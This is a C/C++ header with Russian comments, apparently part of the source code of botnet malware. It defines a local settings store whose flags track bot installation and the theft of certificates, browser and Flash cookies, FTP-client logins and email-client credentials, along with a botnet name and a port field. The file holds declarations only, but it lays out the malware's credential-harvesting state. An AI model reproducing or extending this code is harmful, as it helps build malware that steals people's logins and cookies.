/*
  Управление локальными настройками.
  Здесь хранятся настройки к котороым требуется быстрый и частый доступ.
*/
#pragma once

namespace LocalSettings
{
  //SETTINGS::flags
  enum
  {
    FLAG_BOTNET = 0x1, //Ботнет установлен.
  };

  //SETTINGS::processStartupFlags
  enum
  {
    PSF_CERTSTORE_GRABBED      = 0x01, //Серификаты получены.
    PSF_MFP_GRAB               = 0x02, //Нужно получить кукисы флеш-плеера.
    PSF_MFP_REMOVE             = 0x04, //Нужно удалить кукисы флеш-плеера.
    PSF_SOFTWARE_FTP_GRABBED   = 0x08, //Логины из FTP-клиентов получены.
    PSF_COOKIES_GRABBED        = 0x10, //Кукисы браузеров получены.
    PSF_USER_DISABLED          = 0x20, //Пользователь отключен.
    PSF_SOFTWARE_EMAIL_GRABBED = 0x40, //E-mail'ы из клиентов получены.
  };
  
# pragma pack(push, 1)  
  typedef struct
  {
    DWORD flags;                        //Флаги FLAG_*.
    WCHAR botnet[BOTNET_MAX_CHARS + 1]; //Имя ботнета.
    DWORD processStartupFlags;          //Флаги PSF_*.
    WORD tcpPortS1;                     //Последний порт для S1.
    BYTE reserved[64];                  //Зарезервировано на будущее.
  }SETTINGS;
# pragma pack(pop)

  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Получение текущих настроек без блокировки.

    OUT settings - буфер для настроек.
  */
  void getCurrent(SETTINGS *settings);
  
  /*
    Получение текущих настроек с блокировкой доступа для других потоков и процессов.

    OUT settings - буфер для настроек.

    Return       - true - настроки прочитаны, доступ заблокирован,
                   false - произошла ошибка.
  */
  bool beginReadWrite(SETTINGS *settings);

  /*
    Снятие блокировки созданной beginReadWrite() и сохранение изменений.

    IN OUT settings - настройки для сохранения, или NULL если сохранение не требуется. На выходе
                      содержимое буфера не пригодна для использования.
    
    Return          - true - настройки успешно сохраненны,
                      false - настройки не сохранены.
  */
  bool endReadWrite(SETTINGS *settings);
};
